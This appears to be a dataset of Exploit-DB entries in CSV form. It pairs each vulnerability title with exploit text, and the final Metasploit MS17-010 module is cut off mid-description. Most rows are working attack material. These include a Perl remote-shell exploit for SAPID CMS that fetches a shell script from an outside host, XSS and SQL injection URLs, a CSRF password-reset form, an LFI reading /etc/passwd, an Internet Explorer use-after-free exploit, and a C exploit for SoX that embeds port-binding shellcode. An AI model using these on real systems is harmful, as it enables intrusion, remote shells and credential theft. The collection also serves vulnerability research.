2161,"SAPID CMS 1.2.3_rc3 - 'rootpath' Remote Code Execution ######################################################################### # Title: SAPID CMS Multiple remote Command Execution Vulnerabilities # # Author: Simo64 <simo64_at_morx_org> #  # Discovered: 06 Aout 2006 #  # Published : 08 Aout 2006 #  # MorX Security Research Team #  # http://www.morx.org #  # Vendor : SAPID CMS # # Version : 123 rc3 () #  # Website : http://sapid.sourceforge.net #  # Severity: Critical #  # Details:  #  #  # [+] Remote File Inclusion #  # 1) vulnerable code in usr/extensions/get_infochannel.inc.php lines( 8 - 9 ) #  # if(!defined(""common_extfunctions"")) { define(""common_extfunctions"", ""loaded""); # include($root_path.""usr/system/common_extfunctions.inc.php""); } # # 2) vulnerable code in usr/extensions/get_tree.inc.php lines( 9 - 10 ) # # if(!defined(""common_extfunctions"")) { define(""common_extfunctions"", ""loaded""); # include($GLOBALS[""root_path""].""usr/system/common_extfunctions.inc.php""); } # # $root_path , $GLOBALS[""root_path""] variable are not sanitized ,before it can be used to include files #  # [-] Exploit :  #  # http://localhost/usr/extensions/get_infochannel.inc.php?root_path=http://attacker/cmd.txt?cmd=id;pwd #  # http://localhost/usr/extensions/get_tree.inc.php?GLOBALS[""root_path""]=http://attacker/cmd.txt?cmd=id;pwd # #====================================== # Poc Remote Command Execution Exploit: #====================================== # # http://www.morx.org/sapid.txt # # C:\>perl sapid.pl http://127.0.0.1 # # =============================================================== # =  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  = # =============================================================== # =       MorX Security Research Team - www.morx.org            = # =       Coded by Simo64 - simo64@www.morx.org                 = # ===============================================================  # simo64@morx.org :~$ id; ls # uid=48(apache) gid=48(apache) groups=48(apache) # get_calendar.inc.php # get_filter_list.inc.php # get_gb_records.inc.php # get_infochannelfilter.inc.php # get_infochannel.inc.php # get_rss.inc.php # get_searchresults.inc.php # get_survey.inc.php # get_track.inc.php # get_tree.inc.php # soap_call.inc.php # simo64@morx.org :~$ exit  # Enjoy ! # #!/usr/bin/perl   use LWP::Simple;  print ""\n===============================================================\n""; print ""=  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =\n""; print ""===============================================================\n""; print ""=       MorX Security Research Team - www.morx.org            =\n""; print ""=       Coded by Simo64 - simo64\@www.morx.org                 =\n"";  print ""===============================================================\n\n"";  my $targ,$rsh,$path,$con,$cmd,$data,$getit ;  $targ = $ARGV[0]; $rsh  = $ARGV[1];  if(!$ARGV[1]) {$rsh = ""http://zerostag.free.fr/sh.txt"";}  if(!@ARGV) { &usage;exit(0);}  	$targ = $ARGV[0]; 	  	 	chomp($targ);     chomp($rsh);      	$path = $targ.""/usr/extensions/get_infochannel.inc.php""; 	$con  = get($path) || die ""[-]Cannot connect to Host"";   sub usage(){ 	print ""Usage    : perl $0 host/path [OPTION]\n\n""; 	print ""Exemples : perl $0 http://127.0.0.1\n""; 	print ""           perl $0 http://127.0.0.1 http://yoursite/yourcmd.txt\n\n""; 	}  while ()   {   	 print ""simo64\@morx.org :~\$ ""; 	 chomp($cmd=<STDIN>);      if ($cmd eq ""exit"") { print ""\nEnjoy !\n\n"";exit(0);}      $getit = $path.""?root_path="".$rsh.""?&cmd="".$cmd;      $data=get($getit);      if($cmd eq """"){ print ""Please enter command !\n""; }      else{ print $data ;} }  # milw0rm.com [2006-08-10]",SAPID CMS,1
36883,Webglimpse 2.x - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/52170/info  Webglimpse is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to execute arbitrary script on the affected server and steal cookie-based authentication credentials. Other attacks are also possible.  Webglimpse versions 2.18.8 and prior are affected.   http://www.example.com/wgarcmin.cgi?URL2FIL=URL+2+File+--%3E&URL=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T  http://www.example.com/wgarcmin.cgi?FIL2URL=%3C--+File+2+URL&FILE=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T  http://www.example.com/wgarcmin.cgi?DOMAIN=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T,Webglimpse,1
14372,"Haihaisoft PDF Reader OCX Control 1.1.2.0 - Remote Buffer Overflow (PoC) -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  ================================================================================== ==================================================================================  Haihaisoft PDF Reader OCX Control Remote Buffer Overflow  url: http://www.haihaisoft.com/ ================================================================================== ==================================================================================  Author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://www.shinnai.altervista.org/   This was written for educational purpose. Use it at your own risk.  Author will be not responsible for any damage.   Tested on:  Windows XP Professional SP3 full patched, Internet Explorer 8  Windows 2k Professional SP4 full patched, Internet Explorer 6 ================================================================================== ==================================================================================  File name:	PDFReaderOCX.ocx  Version:	1.1.2.0  ProgID:	PDFReaderOCX.PDFReaderOCXCtrl.1  GUID:		{28CB49D6-E530-442B-A182-79F047C3AA1B}  Descr.:	PDFReaderOCX Control    Marked as:	RegKey Safe for Script: True 		RegKey Safe for Init: True 		Implements IObjectSafety: False ================================================================================== ==================================================================================  This control contains 19 members, as follow:   Members: 19 	    URL 	    Language 	    UnicodeURL 	    ZoomOutput 	    ViewOutput 	    View_ContinuousOutput 	    UpdateURL 	    DownloadURL 	    m_ViewDir 	    RequiredVersion 	    Zoom 	    View 	    Rotate 	    GoTo 	    Open 	    Close 	    UILanguage 	    Print 	    DRMRights   Particularly this one ""URL"" results vulnerable to a buffer overflow if you  pass an overly long string (more than 2048 bytes) as filename and browse to  the crafted web page (e.g. http://www.SomeSite.com/File.pdf) and then  refresh the page. ================================================================================== ==================================================================================  Proof of concept:   <object classid='clsid:28CB49D6-E530-442B-A182-79F047C3AA1B' id='test'></object>   <script language=""vbscript"">   buff = ""AAAAAAAAAAAAAAABBBB"" + String(2011, ""C"")   test.URL = buff    Function tryMe()    document.location.reload   End Function    Sub Window_OnLoad    setTimeout ""tryMe()"",2000   End Sub  </script> ================================================================================== ==================================================================================  Registers:   17:07:08.406  pid=0410 tid=02DC  EXCEPTION (first-chance)                ----------------------------------------------------------------                Exception C0000005 (ACCESS_VIOLATION reading [42424242])                ----------------------------------------------------------------                EAX=0275CD80: 20 82 75 02 78 5E 75 02-41 41 41 41 41 41 41 41                EBX=0275B978: CC 09 6B 02 00 00 00 00-00 00 00 00 98 B4 75 02                ECX=02755E78: 80 CD 75 02 C0 BA 75 02-00 00 00 00 58 64 3D 02                EDX=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??                ESP=0297C5B0: 9F 9D 28 02 F0 A1 75 02-C4 C5 97 02 25 5C 29 02                EBP=0297FFB4: EC FF 97 02 BC B3 6B 79-78 5E 75 02 80 DF 12 00                ESI=0275BAC0: 78 5E 75 02 78 01 75 02-00 08 00 00 00 00 00 00                EDI=0275A1F0: BC 09 6B 02 00 00 00 00-00 00 00 00 0C A2 75 02                EIP=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??                              --> N/A                ---------------------------------------------------------------- ================================================================================== ==================================================================================  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (MingW32)  iQIcBAEBAgAGBQJMQDW4AAoJELleC2c7YdP1cg4P/jD0oq/osKQYYt1xfXCei9Ag rkSyP9D91IwiTW5VQqnEfeDDBRsHAa7Y2xm7O7ZK5tkj1cTKnijyiSOHBum/V94v oA9UGWJDzk2ztjHlUvHA2zrF9uxFxGQRxI+TgJlS9PgGvw3BYDT0ZwemniRY6wtS PMbxiDRKGESPG6xCDCP1XLWUqdEUmlNchkzG1s6dqEbTfYmPcJTP/ffWS7glcJya 3eDoXIGqESBHMtRUKr8JFlEeI/ZpfZ83g5EiomP0KQoQreBBbdx1mER0EpCfgNuo uBUwnZtkD5LA9kFL0mrnG4SC6KEw7s2gWKXwiXesZ8JI8Fuy/nvGy2na+yksTd/h PQpMwtvR8eX1A3z4BZUV4OhgJB8oweAyI0TJUBi3F8VgDDGGDVcrR57HU8gX3S8T Ft5j/xbO2qqCGb9hlgAhV1fQAa+HxXKtrPLp2arsnFCkLU4RINyH3TKK07pT3GSG 009qBpYL//hvV7pwv+pvYfrcZSrDf1yyU3cirVjSAkG23CdicHw7+woj9LgTMNR6 e4wys8kziNfCUVcfseTGWGAVKELxZyJvNhKz8Y6pXg7oSuz41bhf+uozjl/beBPz jOKy6mfUCW2PogRvVOj8j/zkiseDtM3UjMazYuaBUmO8DNl8gpLFL007MN5dbLHM QAGnwRHZypdNlz79bX/+ =kM0M -----END PGP SIGNATURE-----",Haihaisoft PDF Reader OCX Control,1
32851,"Microsoft Internet Explorer 10 - CMarkup Use-After-Free (MS14-012) <!--  MS14-012 Internet Explorer CMarkup Use-After-Free  Vendor Homepage: http://www.microsoft.com  Version: IE 10  Date: 2014-03-31   Exploit Author: Jean-Jamil Khalife  Tested on: Windows 7 SP1 x64 (fr, en)  Flash versions tested: Adobe Flash Player (12.0.0.70, 12.0.0.77)  Home: http://www.hdwsec.fr  Blog : http://www.hdwsec.fr/blog/  MS14-012 / CVE-2014-0322   Generation:  	c:\mxmlc\bin>mxmlc.exe AsXploit.as -o AsXploit.swf   Exploit-DB Mirror:  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32851-AsXploit.as  -->  <html> <head> </head> <body>  <script>  var g_arr = []; var arrLen = 0x250;  function dword2data(dword) { 	var d = Number(dword).toString(16); 	while (d.length < 8) 		d = '0' + d;  	return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4)); }  function eXpl() {     var a=0;      for (a=0; a < arrLen; a++) {         g_arr[a] = document.createElement('div');     } 	 	// Build a new object 	var b = dword2data(0x19fffff3);     while (b.length < 0x360) 	{ 		// mov     eax,dword ptr [esi+98h] 		// ... 		// mov     eax,dword ptr [eax+8] 		// and     dword ptr [eax+2F0h],0FFFFFFBFh 		if (b.length == (0x98 / 2)) 		{ 			b += dword2data(0x1a000010); 		} 		// mov     ecx,dword ptr [edx+94h] 		// mov     eax,dword ptr [ecx+0Ch] 		else if (b.length == (0x94 / 2)) 		{ 			b += dword2data(0x1a111111); 		} 		// mov     eax,dword ptr [edx+15Ch] 		// mov     ecx,dword ptr [eax+edx*8] 		else if (b.length == (0x15c / 2)) 		{ 			b += dword2data(0x42424242); 		} 		else 		{ 			b += dword2data(0x19fffff3); 		} 	}      	var d = b.substring(0, ( 0x340 - 2 )/2);      	// trigger 	try{         this.outerHTML=this.outerHTML     }  	catch(e){ 		 	} 	     CollectGarbage();  	// Replace freed object     for (a=0; a < arrLen; a++)     {         g_arr[a].title = d.substring(0, d.length);     } }  // Trigger the vulnerability function trigger() {     var a = document.getElementsByTagName(""script"");     var b = a[0];     b.onpropertychange = eXpl;     var c = document.createElement('SELECT');     c = b.appendChild(c); }    </script> <embed src=AsXploit.swf width=""10"" height=""10""></embed> </body> </html>",Microsoft Internet Explorer,1
37553,"eNdonesia - 'cid' SQL Injection source: https://www.securityfocus.com/bid/54741/info  eNdonesia is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  eNdonesia 8.5 is vulnerable; other versions may also be affected.   http://www.example.com/eNdonesia/mod.php?mod=diskusi&op=viewcat&cid=-[id][SQL INJECTION]",eNdonesia,1
14096,"CMSQLite / CMySQLite 1.3 - Cross-Site Request Forgery # Title: CMSQlite & CMySQLite CSRF Vulnerability # Author: ADEO Security # Published: 28/06/2010 # Version: v1.3 >= # Vendor: http://www.cmsqlite.net  # Description: ""CMSQLite is a small, fast, flexible and complete Content-Management-System (CMS).  # It's perfect for freelancers, self-employeds, clubs and associations and small companies.  # CMSQLite is a CMS, basing on PHP and SQLite. That has many advantages!""  # Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs (security@adeo.com.tr)  # Vulnerability: CMSQlite and CMySQLite have CSRF vulnerabilites in the admin panel. # Attacker can change the password of the admin. For secure your web applications against  # CSRF vulnerabilities, look at this resources: * OWASP-TR/WGT anticsurf Project - http://code.google.com/p/anticsurf/ * CSRF Prevention CS - http://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet  # PoC: <html> <body> <form action=""http://server/admin/helper/updateUser.php\"" method=""POST""> <input type=""hidden"" name=""userId"" value=""1""> <input type=""hidden"" name=""userUsername"" value=""admin""> <input type=""hidden"" name=""password1"" value=""csrfhits""> <input type=""hidden"" name=""password2"" value=""csrfhits""> </form>  </body> </html>",CMySQLite,1
37919,"Microsoft Windows - 'win32k.sys' TTF Font Processing IUP[] Program Instruction Pool-Based Buffer Overflow Source: https://code.google.com/p/google-security-research/issues/detail?id=368&can=1  We have encountered a number of Windows kernel crashes in the win32k!itrp_IUP function (a handler of the IUP[] TTF program instruction) while processing corrupted TTF font files, such as:  --- PAGE_FAULT_IN_NONPAGED_AREA (50) Invalid system memory was referenced.  This cannot be protected by try-except, it must be protected by a Probe.  Typically the address is just plain bad or it is pointing at freed memory. Arguments: Arg1: ff6895b8, memory referenced. Arg2: 00000001, value 0 = read operation, 1 = write operation. Arg3: 91f4a4f1, If non-zero, the instruction address which referenced the bad memory 	address. Arg4: 00000000, (reserved)  [...]  FAULTING_IP:  win32k!itrp_IUP+2fb 91f4a4f1 8904b2          mov     dword ptr [edx+esi*4],eax  MM_INTERNAL_CODE:  0  DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT  BUGCHECK_STR:  0x50  PROCESS_NAME:  csrss.exe  CURRENT_IRQL:  0  LAST_CONTROL_TRANSFER:  from 91f4bc79 to 91f4a4f1  STACK_TEXT:   8adcf3b8 91f4bc79 00000001 91f517d3 00000000 win32k!itrp_IUP+0x2fb 8adcf3c0 91f517d3 00000000 ff64eb28 00b61838 win32k!itrp_InnerExecute+0x38 8adcf3f8 91f4bc79 ff64eb28 91f4f088 ff64ebbc win32k!itrp_CALL+0x23b 8adcf400 91f4f088 ff64ebbc ff64eb84 ff64f95c win32k!itrp_InnerExecute+0x38 8adcf480 91f53234 00b61804 00b61838 ff64eb28 win32k!itrp_Execute+0x2b2 8adcf4a8 91f529dc 00b61804 00b61838 ff64eb28 win32k!itrp_ExecuteGlyphPgm+0x4a 8adcf4dc 91f51e5e ff64a570 00000001 00000000 win32k!fsg_SimpleInnerGridFit+0x102 8adcf574 91f5238c ff64a250 ff64b73c ff64eb28 win32k!fsg_ExecuteGlyph+0x1ce 8adcf5d0 91f52202 ff64a250 ff64eb28 ff64b6b4 win32k!fsg_CreateGlyphData+0xea 8adcf610 91f4f419 ff64a250 ff64eb28 ff64a2c4 win32k!fsg_GridFit+0x4d 8adcf688 91f5906c 00000001 8adcf6a4 91f58fc3 win32k!fs__Contour+0x287 8adcf694 91f58fc3 ff64a010 ff64a07c 8adcf6c0 win32k!fs_ContourGridFit+0x12 8adcf6a4 91f5991f ff64a010 ff64a07c 00000027 win32k!fs_NewContourGridFit+0x10 8adcf6c0 91f59960 fb8b0e78 00000027 8adcf6fc win32k!bGetGlyphOutline+0xd7 8adcf6e8 91f59b59 fb8b0e78 00000027 00000001 win32k!bGetGlyphMetrics+0x20 8adcf82c 91f4ec63 fb8b0e78 00000027 8adcf918 win32k!lGetGlyphBitmap+0x2b 8adcf850 91f4eab6 00000000 00000001 00000027 win32k!ttfdQueryFontData+0x158 8adcf8a0 91f4dce2 ff7af010 fba32cf0 00000001 win32k!ttfdSemQueryFontData+0x45 8adcf8e8 91f53774 ff7af010 fba32cf0 00000001 win32k!PDEVOBJ::QueryFontData+0x3e 8adcf960 91fcbc8d 8adcfc3c fb87ec00 ff6470cc win32k!xInsertMetricsPlusRFONTOBJ+0x120 8adcf990 91f4594d 0000000a ff7bf000 8adcfcd0 win32k!RFONTOBJ::bGetGlyphMetricsPlus+0x179 8adcf9c8 91fcb78b 8adcfc1c 8adcfc3c 00000008 win32k!ESTROBJ::vCharPos_H3+0xf0 8adcfa0c 91f455d0 8adcfcd0 0000000a 8adcfc1c win32k!ESTROBJ::vInit+0x268 8adcfc2c 91f45793 00000000 8adcfcd0 fba32cf0 win32k!GreGetTextExtentExW+0x12a 8adcfd0c 82657896 0801016f 02d90bac 0000000a win32k!NtGdiGetTextExtentExW+0x141 8adcfd0c 77b370f4 0801016f 02d90bac 0000000a nt!KiSystemServicePostCall WARNING: Frame IP not in any known module. Following frames may be wrong. 0021f6c4 00000000 00000000 00000000 00000000 0x77b370f4 ---  Depending on the malformed font file, the crashes occur at various locations in the win32k!itrp_IUP function, such as:  win32k!itrp_IUP+141: test    [esi+edx], cl win32k!itrp_IUP+173: test    [eax+edx], cl win32k!itrp_IUP+17b: mov     eax, [ecx+ebx*4] win32k!itrp_IUP+184: mov     ecx, [ecx] win32k!itrp_IUP+213: mov     eax, [ebx] win32k!itrp_IUP+2c9: mov     eax, [eax+esi*4] win32k!itrp_IUP+2fb: mov     [edx+esi*4], eax win32k!itrp_IUP+317: add     [eax+esi*4], edx  This is caused by the fact that the function operates (reads from and writes to) on memory well beyond of the dynamically allocated buffers, leading to a pool-based buffer overflow of controlled size and content, consequently allowing for remote code execution in the context of the Windows kernel.  It appears that the culprit of the vulnerability is the lack of handling of a corner case explicitly mentioned in the ""The TrueType Instruction Set, Part 2"" specification [1]:  ""This instruction operates on points in the glyph zone pointed to by zp2. This zone should almost always be zone 1. Applying IUP to zone 0 is an error.""  Every testcase we have examined contains an SZP2[] instruction (""Set Zone Pointer 2"") with a 0 argument followed by the IUP[] instruction later on in the TTF program. The faulty instruction stream has the same outcome regardless of its location (i.e. font pre-program, glyph program etc.).  The issue reproduces on Windows 7 and 8.1. It is easiest to reproduce with Special Pools enabled for win32k.sys (leading to an immediate crash when the bug is triggered), but it is also possible to observe a crash on a default Windows installation in the form of a crash in win32k!itrp_IUP or another location in kernel space, as caused by the corrupted pool state, depending on the specific testcase used.  Attached is an archive with eight sample files, each crashing at a different location in the win32k!itrp_IUP function on Windows 7 32-bit, together with corresponding kernel crash logs.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37919.zip",Microsoft Windows,1
374,"SoX - '.wav' Local Buffer Overflow //--------------------------------- Begin Code: sox-exploiter.c --------------------------------- /*     Copyright Rosiello Security 2004                http://www.rosiello.org   CVE Reference: CAN-2004-0557 Bug Type: Stack Overflow Date: 01/08/2004   Ulf Harnhammar reported that there are two buffer overflows in the 'sox' and 'play' commands. The flaws reside in the st_wavstartread() function in 'wav.c', where the function reads data based on a user-supplied size variable into a buffer without checking to see if the specified amount of data will fit into the buffer.  The report indicates that older versions, including 12.17.1, 12.17 and 12.16, are not affected.  Vendors were reportedly notified on July 18, 2004. Impact: A remote user can create a WAV file that, when processed by the target user, will execute arbitrary code on the target system with the privileges of the SoX process. Solution: No vendor solution was available at the time of this entry.  ************************************************************************************************** !!! DO NOT USE THIS SOFTWARE TO BREAK THE LAW !!!  This exploit will create a malevolent .wav file that will execute the shellcode (it's a port_bind() opening the port 5074) Example: $./sox-exploiter laser.wav malevolent.wav 0 When you play the file malevolent.wav the shellcode is executed.  AUTHOR: rave --> rave@rosiello.org AUTHOR: Angelo Rosiello --> angelo@rosiello.org WEB : http://www.rosiello.org */   #include <netdb.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netdb.h> #include <sys/types.h> #include <sys/socket.h> #include <arpa/inet.h>  #include <stdio.h> #include <stdlib.h> #include <fcntl.h> #include <sys/types.h>   /* used for stating */ #include <sys/types.h> #include <sys/stat.h>  /* used for mmap */ #include <sys/mman.h>  /* perror() */ #include <errno.h>  /* strstr */ #include <string.h>   enum { suse, redhat, slackware };   struct tr {   char *OS;   unsigned long ret;   } target [] = {       ""SuSe 9.1 Pro"",      0xbfffe9f0,        ""Redhat 9.1"",      0x41414141    };  signed char shellcode[]=  ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""         ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""  /*  * s0t4ipv6@Shellcode.com.ar  * x86 portbind a shell in port 5074  * 92 bytes.  */  ""\x31\xc0"" // xorl %eax,%eax ""\x50"" // pushl %eax ""\x40"" // incl %eax ""\x89\xc3"" // movl %eax,%ebx ""\x50"" // pushl %eax ""\x40"" // incl %eax ""\x50"" // pushl %eax ""\x89\xe1"" // movl %esp,%ecx ""\xb0\x66"" // movb $0x66,%al ""\xcd\x80"" // int $0x80 ""\x31\xd2"" // xorl %edx,%edx ""\x52"" // pushl %edx ""\x66\x68\x13\xd2"" // pushw $0xd213 ""\x43"" // incl %ebx ""\x66\x53"" // pushw %bx ""\x89\xe1"" // movl %esp,%ecx ""\x6a\x10"" // pushl $0x10 ""\x51"" // pushl %ecx ""\x50"" // pushl %eax ""\x89\xe1"" // movl %esp,%ecx ""\xb0\x66"" // movb $0x66,%al ""\xcd\x80"" // int $0x80 ""\x40"" // incl %eax ""\x89\x44\x24\x04"" // movl %eax,0x4(%esp,1) ""\x43"" // incl %ebx ""\x43"" // incl %ebx ""\xb0\x66"" // movb $0x66,%al ""\xcd\x80"" // int $0x80 ""\x83\xc4\x0c"" // addl $0xc,%esp ""\x52"" // pushl %edx ""\x52"" // pushl %edx ""\x43"" // incl %ebx ""\xb0\x66"" // movb $0x66,%al ""\xcd\x80"" // int $0x80 ""\x93"" // xchgl %eax,%ebx ""\x89\xd1"" // movl %edx,%ecx ""\xb0\x3f"" // movb $0x3f,%al ""\xcd\x80"" // int $0x80 ""\x41"" // incl %ecx ""\x80\xf9\x03"" // cmpb $0x3,%cl ""\x75\xf6"" // jnz <shellcode+0x40> ""\x52"" // pushl %edx ""\x68\x6e\x2f\x73\x68"" // pushl $0x68732f6e ""\x68\x2f\x2f\x62\x69"" // pushl $0x69622f2f ""\x89\xe3"" // movl %esp,%ebx ""\x52"" // pushl %edx ""\x53"" // pushl %ebx ""\x89\xe1"" // movl %esp,%ecx ""\xb0\x0b"" // movb $0xb,%al ""\xcd\x80"" // int $0x80 ;  signed long shelladdr =0xbfffe9f0;//0xbfffe9d8;//0xbffff3ea;  char *memap; char *fs_io(char *filename, char *data, mode_t flags, long *size) { struct stat status; int fd;  if ( data == NULL) {  if ( lstat (filename,&status) < 0) {  printf(""Input File not found\n"");  exit(-1); }  if ((fd=open ( filename , flags,0666)) == -1) {   perror(""open"");   exit (-1);   }     memap=mmap(0,status.st_size,PROT_READ|PROT_WRITE,MAP_PRIVATE,fd,0);    if ( memap == NULL)    {printf(""allocation problem\n""); exit (-1);}     (*(long *)size) = status.st_size;    return (char *)memap;   }   }   int connect_to( char *addr) { struct sockaddr_in sin4; int sock; char in [512]; char out [512]; char banner[512]; size_t size;     sin4.sin_family = AF_INET;    sin4.sin_addr.s_addr = inet_addr(addr);    sin4.sin_port = htons(5074);     sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);    if (!sock)    {      return -1;    }    if (connect (sock,(struct sockaddr *)&sin4,sizeof(struct sockaddr_in)) ==-1)   {      return -1;     }      printf(""[+] Exploit success\n"");     size=sprintf(banner,""%s"",""uname -a;\n"");     write ( sock, banner, size );      while ( 1 )     {     size=read (sock,in,sizeof(in));     in[size] = '\0';     printf(""%s\n"",in);       scanf(""%s"",&out);     strcat(out,""\n"");      write (sock, out,strlen(out));     memset(in,'\0',sizeof(in));     memset(out,'\0',sizeof(out));     }   }  void usage(char *file) { int i; printf(""USAGE:\n""); printf(""SoX Exploiter by Rosiello Security\n""); printf(""%s source.wav vulnerable.wav target\n"", file); for (i=0;i < 2;i++) printf(""TARGET: %d %s %x\n"",i,target[i].OS,target[i].ret); exit(0); }   int main(int argc, char **argv) {    char *ptr,*tmp;   int fd,count;   long sizefield,sizeloc;   int size;   char payload[500];   pid_t pid;   int opt;   if ((argc) != 4)     usage(argv[0]);   opt=atoi(argv[3]);    memap = fs_io(argv[1],NULL,O_RDWR,&size);    printf(""[+] Sox Exploiter by Rosiello Security\n"");   printf(""[+] Opened %s size : %d\n"",argv[1],size);     ptr = memap;   count =0;   do   {    ptr++;    if ((strncmp(""INFOICRD"",ptr,8)==0)) break;    } while ( (count ++ !=size) );    tmp = (char *)malloc ( size + 512);   tmp = memap;    ptr +=8;   sizefield = (long) ptr[0];   sizeloc = (long) (count + 8)+1;    tmp[sizeloc]=01;   tmp[sizeloc+1]=02;    if ((fd=open ( argv[2] , O_WRONLY | O_CREAT | O_TRUNC,0666)) == -1) {    perror(""open"");    return -1;   }    sizeloc +=2;   write(fd,tmp,sizeloc);    memset(payload,0x2e,318);    size=sprintf(payload+318,""%s%s"",((char *)&target[opt].ret),shellcode);     write (fd,payload,sizeof(payload));   close(fd);    size = 0x0102 - size;    printf(""[+] Coded by rave & Angelo Rosiello\n"");   printf(""[+] Writing evil code into %s\n"", argv[2]);   printf(""[+] Org sizefield = %d new sizefield = %d\n"",sizefield,0x0102);   printf(""[+] Overflowing the buffer with %d Bytes\n"",size);   printf(""[+] Executing /usr/bin/sox\n"");   printf(""[+] Connecting to localhost\n"");    pid = fork();   if (pid ==0) {     execl(""/usr/bin/sox"",""sox"",argv[2],""-t"",""ossdsp"",""/dev/dsp"" ,NULL);     };    sleep(1);   if ((connect_to(""127.0.0.1"")) <0)     printf(""[-] Exploit failed\n"");    return EXIT_SUCCESS; } //---------------------------------- End Code: sox-exploiter.c ----------------------------------  // milw0rm.com [2004-08-04]",SoX,1
9994,"Apache Tomcat - Cookie Quote Handling Remote Information Disclosure The following examples are available:  +++ GET /myapp/MyCookies HTTP/1.1 Host: localhost Cookie: name=""val "" ue"" Cookie: name1=moi +++  http://www.example.com/examples/servlets/servlet/CookieExample?cookiename=test&cookievalue=test%5c%5c%22%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC% 3B+Path%3D%2Fservlets-examples%2Fservlet+%3",Apache Tomcat,1
12118,"Joomla! Component PowerMail Pro 1.5.3 - Local File Inclusion ===============================================================================================================     [o] Joomla Component PowerMail Pro Local File Inclusion Vulnerability          Software : com_powermail version 1.5.3        Vendor   : http://www.givesight.org        Author   : AntiSecurity [ Vrs-hCk NoGe OoN_BoY Paman zxvf s4va ]        Contact  : public[at]antisecurity[dot]org        Home     : http://antisecurity.org/   ===============================================================================================================     [o] Exploit         http://localhost/[path]/index.php?option=com_powermail&controller=[LFI]     [o] PoC         http://localhost/index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00   ===============================================================================================================     [o] Greetz         Angela Zhang stardustmemory aJe martfella pizzyroot Genex        H312Y yooogy mousekill }^-^{ noname matthews kaka11 wishnusakti        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke   ===============================================================================================================     [o] Special         Happy birthday OoN_BoY ^_______^        Wish u all the best brotha.. GBU     [o] April 09 2010 - GMT +07:00 Jakarta, Indonesia",Joomla! Component PowerMail Pro,1
38154,cPanel - 'detailbw.html' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/57060/info   cPanel and WHM are prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   cPanel 11.34.0 and WHM 11.34.0 are vulnerable; other versions may also be affected.   http://www.example.com/frontend/x3/stats/detailbw.html?mon=Dec&year=2006&domain=%3Cscript%3Ealert%28%22XSS%20Vulnerability%22%29%3C/script%3E&target=x3demob,cPanel,1
26666,"CenterICQ 4.20/4.5 - Packet Handling Remote Denial of Service // source: https://www.securityfocus.com/bid/15649/info  CenterICQ is prone to a remote denial-of-service vulnerability.  The vulnerability presents itself when the client is running on a computer that is directly connected to the Internet and handles malformed packets on the listening port for ICQ messages.  A successful attack can cause the client to crash.   #include <string.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  #define DEST_IP   ""192.168.1.33"" #define DEST_PORT 7777      main()     {         int sockfd;         struct sockaddr_in dest_addr;   // will hold the destination addr          sockfd = socket(AF_INET, SOCK_STREAM, 0); // do some error checking!          dest_addr.sin_family = AF_INET;          // host byte order         dest_addr.sin_port = htons(DEST_PORT);   // short, network byte order         dest_addr.sin_addr.s_addr = inet_addr(DEST_IP);         memset(&(dest_addr.sin_zero), '\0', 8);  // zero the rest of the struct          // don't forget to error check the connect()!         connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr)); 	char *msg[] = { 0x01 }; 	send(sockfd, msg, 1, 0); }",CenterICQ,1
43970,"Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  # Windows XP systems that are not part of a domain default to treating all # network logons as if they were Guest. This prevents SMB relay attacks from # gaining administrative access to these systems. This setting can be found # under: # #  Local Security Settings > #   Local Policies > #    Security Options > #     Network Access: Sharing and security model for local accounts  class MetasploitModule < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010   include Msf::Exploit::Powershell   include Msf::Exploit::EXE   include Msf::Exploit::WbemExec   include Msf::Auxiliary::Report    def initialize(info = {})     super(update_info(info,       'Name'           => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution',       'Description'    => %q{         This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where         primitive. This will then be used to overwrite the connection session information with as an         Administrator session. From there, the normal psexec payload code execution is done.          Exploits a type confusion between Transaction and WriteAndX requests and a race condition in         Transaction requests, as seen in the EternalRomance, 